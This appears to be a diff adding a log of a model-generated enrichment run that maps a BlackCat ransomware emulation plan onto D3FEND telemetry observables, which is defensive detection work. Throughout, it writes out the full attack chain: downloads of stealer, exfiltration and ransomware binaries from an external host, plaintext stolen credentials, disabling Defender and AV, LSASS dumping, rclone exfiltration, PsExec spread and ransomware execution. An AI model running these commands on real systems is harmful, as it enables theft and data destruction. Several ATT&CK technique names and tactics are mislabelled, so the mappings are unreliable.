@@ -1,0 +1,995 @@
+================================================================================
+Test Type: D3FEND Enrichment
+Model: openai/gpt-oss-120b
+Timestamp: 2026-01-20T12:08:50.766994
+Input Tokens: 3473
+Output Tokens: 3632
+Total Tokens: 7105
+================================================================================
+{
+  "metadata": {
+    "source_file": "./enriched_control.json",
+    "enriched_at": "2026-01-20T12:09:11.520414",
+    "model": "openai/gpt-oss-120b",
+    "total_duration_ms": 142100
+  },
+  "procedure": {
+    "action_sequence": [
+      // OUtside of the Attack_chain from a Blue perspective or victim perspective
+      // {
+      //   "step_id": 1,
+      //   "original_step_id": null,
+      //   "tactic": "Initial Access",
+      //   "technique_id": "T1078.001",
+      //   "technique_name": "Valid Accounts: Default Accounts",
+      //   "os": "Linux",
+      //   "host": "kraken",
+      //   "command": "mstsc /v:176.59.1.18",
+      //   "description": "Operator establishes an RDP session to the Kali attack platform (kraken) using valid credentials.",
+      //   "d3fend_observables": [
+      //     "CommandHistoryLog",
+      //     "Credential",
+      //     "ExecutableBinary",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "Session",
+      //     "UserAccount"
+      //   ],
+      //   "execution_observables": [
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "Session"
+      //   ],
+      //   "telemetry_classes": [
+      //     "identity",
+      //     "network",
+      //     "process"
+      //   ],
+      //   "execution_level": "non-elevated"
+      // },
+      // {
+      //   "step_id": 2,
+      //   "original_step_id": null,
+      //   "tactic": "Command and Control",
+      //   "technique_id": "T1105",
+      //   "technique_name": "Ingress Tool Transfer",
+      //   "os": "Linux",
+      //   "host": "kraken",
+      //   "command": "sudo rclone serve webdav /srv/http --addr 176.59.1.18:8080",
+      //   "description": "Start a WebDAV server with rclone to serve as an exfiltration sink for stolen credentials.",
+      //   "d3fend_observables": [
+      //     "CommandHistoryLog",
+      //     "ExecutableBinary",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "Session",
+      //     "URL",
+      //     "WebNetworkTraffic"
+      //   ],
+      //   "execution_observables": [
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "URL",
+      //     "WebNetworkTraffic"
+      //   ],
+      //   "telemetry_classes": [
+      //     "network",
+      //     "process"
+      //   ],
+      //   "execution_level": "elevated"
+      // },
+      // {
+      //   "step_id": 3,
+      //   "original_step_id": null,
+      //   "tactic": "Command and Control",
+      //   "technique_id": "T1105",
+      //   "technique_name": "Ingress Tool Transfer",
+      //   "os": "Linux",
+      //   "host": "kraken",
+      //   "command": "cd alphv_blackcat/Resources/control_server && sudo ./controlServer -c config/msr2_handler_config.yml",
+      //   "description": "Launch the evalsC2file server that will host tools (InfoStealer, ExMatter, BlackCat binaries) for later download.",
+      //   "d3fend_observables": [
+      //     "CommandHistoryLog",
+      //     "Directory",
+      //     "ExecutableBinary",
+      //     "File",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process"
+      //   ],
+      //   "execution_observables": [
+      //     "File",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process"
+      //   ],
+      //   "telemetry_classes": [
+      //     "file",
+      //     "network",
+      //     "process"
+      //   ],
+      //   "execution_level": "elevated"
+      // },
+      // {
+      //   "step_id": 4,
+      //   "original_step_id": null,
+      //   "tactic": "Initial Access",
+      //   "technique_id": "T1078.001",
+      //   "technique_name": "Valid Accounts: Default Accounts",
+      //   "os": "Windows",
+      //   "host": "raremon",
+      //   "command": "mstsc /v:10.30.10.4",
+      //   "description": "RDP from the attacker machine to the contractor workstation using compromised credentials.",
+      //   "d3fend_observables": [
+      //     "CommandHistoryLog",
+      //     "Credential",
+      //     "EventLog",
+      //     "ExecutableBinary",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "Session",
+      //     "UserAccount"
+      //   ],
+      //   "execution_observables": [
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Process",
+      //     "Session"
+      //   ],
+      //   "telemetry_classes": [
+      //     "identity",
+      //     "network",
+      //     "process"
+      //   ],
+      //   "execution_level": "non-elevated"
+      // },
+      // {
+      //   "step_id": 5,
+      //   "original_step_id": null,
+      //   "tactic": "Initial Access",
+      //   "technique_id": "T1078.001",
+      //   "technique_name": "Valid Accounts: Default Accounts",
+      //   "os": "Windows",
+      //   "host": "kimeramon",
+      //   "command": "mstsc /v:10.20.20.11 /u:DIGIREVENGE\\zorimoto /p:tzTVgs44isT4YxWU!",
+      //   "description": "RDP from the contractor workstation to the corporate bastion host using the stolen contractor credentials.",
+      //   "d3fend_observables": [
+      //     "CommandHistoryLog",
+      //     "Credential",
+      //     "EventLog",
+      //     "ExecutableBinary",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Password",
+      //     "Process",
+      //     "Session",
+      //     "UserAccount"
+      //   ],
+      //   "execution_observables": [
+      //     "Credential",
+      //     "Hostname",
+      //     "IPAddress",
+      //     "NetworkTraffic",
+      //     "Password",
+      //     "Process",
+      //     "Session"
+      //   ],
+      //   "telemetry_classes": [
+      //     "identity",
+      //     "network",
+      //     "process"
+      //   ],
+      //   "execution_level": "non-elevated"
+      // },
+      {
+        "step_id": 6,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer adrecon /download https://raw.githubusercontent.com/sense-of-security/ADRecon/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1 %USERPROFILE%\\Downloads\\ADRecon.ps1",
+        "description": "Download the ADRecon PowerShell script to the bastion host for AD enumeration.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 7,
+        "original_step_id": null,
+        "tactic": "Discovery",
+        "technique_id": "T1087.002",
+        "technique_name": "Account Discovery: Domain Account",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "powershell -ExecutionPolicy Bypass -File %USERPROFILE%\\Downloads\\ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV",
+        "description": "Execute ADRecon to enumerate domain groups, privileged accounts, and domain\u2011joined computers.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "Directory",
+          "EventLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "UserAccount"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableScript",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 8,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1197",
+        "technique_name": "BITS Jobs",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer info1 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "description": "Download the InfoStealer tool to the bastion host using BITS.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 9,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "%TEMP%\\netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Run InfoStealer to extract plaintext credentials from the local SQL Server database (NetBNMBackup).",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "EventLog",
+          "ExecutableBinary",
+          "File",
+          "Password",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 10,
+        "original_step_id": null,
+        "tactic": "Initial Access",
+        "technique_id": "T1078.001",
+        "technique_name": "Valid Accounts: Default Accounts",
+        "os": "Windows",
+        "host": "datamon",
+        "command": "mstsc /v:10.20.10.122 /u:DIGIREVENGE\\zorimoto /p:tzTVgs44isT4YxWU!",
+        "description": "RDP from the bastion host to the SQL Server host to harvest additional credentials.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "EventLog",
+          "ExecutableBinary",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Password",
+          "Process",
+          "Session"
+        ],
+        "execution_observables": [
+          "Credential",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Password",
+          "Process",
+          "Session"
+        ],
+        "telemetry_classes": [
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 11,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1197",
+        "technique_name": "BITS Jobs",
+        "os": "Windows",
+        "host": "datamon",
+        "command": "bitsadmin /transfer info2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "description": "Download InfoStealer onto the SQL Server host.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 12,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "os": "Windows",
+        "host": "datamon",
+        "command": "%TEMP%\\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Execute InfoStealer to extract DPAPI\u2011protected credentials (local admin, Linux admin, domain admin).",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "EventLog",
+          "ExecutableBinary",
+          "File",
+          "Password",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 13,
+        "original_step_id": null,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1562.001",
+        "technique_name": "Impair Defenses: Disable Security Tools",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "taskkill /F /IM <AV_process_name>",
+        "description": "Terminate AV/EDR processes via Task Manager (run as Administrator).",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "EventLog",
+          "ExecutableBinary",
+          "Process"
+        ],
+        "execution_observables": [
+          "Process"
+        ],
+        "telemetry_classes": [
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 14,
+        "original_step_id": null,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1562.001",
+        "technique_name": "Impair Defenses: Disable Security Tools",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "description": "Disable Windows Defender real\u2011time protection via PowerShell.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "EventLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "Process"
+        ],
+        "execution_observables": [
+          "Process"
+        ],
+        "telemetry_classes": [
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 15,
+        "original_step_id": null,
+        "tactic": "Defense Evasion",
+        "technique_id": "T1112",
+        "technique_name": "Modify Registry",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
+        "description": "Enable WDigest clear\u2011text credential caching by creating the registry key.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "EventLog",
+          "ExecutableBinary",
+          "Process",
+          "WindowsRegistryKey",
+          "WindowsRegistryValue"
+        ],
+        "execution_observables": [
+          "Process",
+          "WindowsRegistryKey",
+          "WindowsRegistryValue"
+        ],
+        "telemetry_classes": [
+          "process",
+          "registry"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 16,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "taskmgr.exe -> Details -> lsass.exe -> Create dump file",
+        "description": "Create a memory dump of LSASS to capture cached credentials.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "EventLog",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 17,
+        "original_step_id": null,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer rclone /download https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip %TEMP%\\rclone.zip",
+        "description": "Download rclone binary to the bastion host for later exfiltration.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 18,
+        "original_step_id": null,
+        "tactic": "Exfiltration",
+        "technique_id": "T1048.003",
+        "technique_name": "Exfiltration Over Web Services",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "rclone copy \"C:\\Users\\windesk\\AppData\\Local\\Temp\\lsass.DMP\" webdav:",
+        "description": "Exfiltrate the LSASS dump file to the attacker\u2011controlled WebDAV server.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 19,
+        "original_step_id": null,
+        "tactic": "Discovery",
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "Invoke-Portscan -Hosts \"10.20.20.0/24\" -ErrorAction SilentlyContinue | Where {$_.alive -eq $true}",
+        "description": "Run a PowerShell port\u2011scanning script to discover live hosts on the workstation and server subnets.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableScript",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 20,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1197",
+        "technique_name": "BITS Jobs",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer exmatter /download http://theinator.com/digirevenge/collector1.exe %TEMP%\\collector1.exe",
+        "description": "Download the ExMatter data\u2011collection tool via BITS.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 21,
+        "original_step_id": null,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.002",
+        "technique_name": "Remote Services: SMB/Windows Admin Shares",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "psexec -c -accepteula \\\\10.20.20.22,\\\\10.20.20.33,\\\\10.20.10.4,\\\\10.20.10.23,\\\\10.20.10.122,\\\\10.20.10.200 C:\\Users\\zorimoto\\AppData\\Local\\Temp\\collector1.exe",
+        "description": "Use PsExec to execute ExMatter on multiple workstation and server hosts.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "Session",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "Session"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 22,
+        "original_step_id": null,
+        "tactic": "Collection",
+        "technique_id": "T1025",
+        "technique_name": "Data from Removable Media",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "C:\\Users\\zorimoto\\AppData\\Local\\Temp\\collector1.exe",
+        "description": "Run ExMatter locally on the bastion host to collect files and system information.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "EventLog",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "Process"
+        ],
+        "telemetry_classes": [
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 23,
+        "original_step_id": null,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer blackcatlin /download http://theinator.com/digirevenge/digirevenge %TEMP%\\digirevenge",
+        "description": "Download the Linux variant of the BlackCat ransomware to the bastion host.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 24,
+        "original_step_id": null,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.004",
+        "technique_name": "Remote Services: SSH",
+        "os": "Linux",
+        "host": "leomon",
+        "command": "scp $Env:temp\\digirevenge marakawa@10.20.10.16:/tmp/digirevenge",
+        "description": "Copy the Linux ransomware binary to the KVM server over SSH.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 25,
+        "original_step_id": null,
+        "tactic": "Execution",
+        "technique_id": "T1059.001",
+        "technique_name": "Command Shell",
+        "os": "Linux",
+        "host": "leomon",
+        "command": "ssh -t marakawa@10.20.10.16 \"chmod +x /tmp/digirevenge && sudo /tmp/digirevenge --access-token 15742aa362a84ba3\"",
+        "description": "Execute the Linux BlackCat ransomware on the KVM host to encrypt virtual machine disks.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 26,
+        "original_step_id": null,
+        "tactic": "Impact",
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer blackcatwin /download http://theinator.com/digirevenge/digirevenge.exe %TEMP%\\digirevenge.exe",
+        "description": "Download the Windows variant of BlackCat ransomware to the bastion host.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 27,
+        "original_step_id": null,
+        "tactic": "Execution",
+        "technique_id": "T1059.003",
+        "technique_name": "Windows Command Shell",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "C:\\Users\\zorimoto\\AppData\\Local\\Temp\\digirevenge.exe --access-token 15742aa362a84ba3",
+        "description": "Execute the Windows BlackCat ransomware with domain\u2011admin privileges to encrypt files on multiple Windows hosts.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "EventLog",
+          "ExecutableBinary",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "Process"
+        ],
+        "telemetry_classes": [
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 28,
+        "original_step_id": null,
+        "tactic": "Collection",
+        "technique_id": "T1119",
+        "technique_name": "Automated Collection",
+        "os": "Windows",
+        "host": "blacknoirmon",
+        "command": "PowerShell script to copy C$\\Windows\\System32\\clog.xtlog from all hosts to a central folder and zip it",
+        "description": "Gather BlackCat activity logs from all compromised Windows machines for post\u2011operation analysis.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableScript",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 29,
+        "original_step_id": null,
+        "tactic": "Exfiltration",
+        "technique_id": "T1048.003",
+        "technique_name": "Exfiltration Over Web Services",
+        "os": "Linux",
+        "host": "kraken",
+        "command": "scp op1@176.59.1.18:/tmp/sblogs.zip ./",
+        "description": "Copy the collected log archive from the attack platform to the analyst workstation for decryption.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 30,
+        "original_step_id": null,
+        "tactic": "Impact",
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "os": "Linux",
+        "host": "leomon",
+        "command": "python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i ~/kvm.log -o ~/dec_kvm.log --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9",
+        "description": "Decrypt the Linux ransomware log to verify successful VM encryption.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "ExecutableScript",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      }
+    ]
+  }
+}
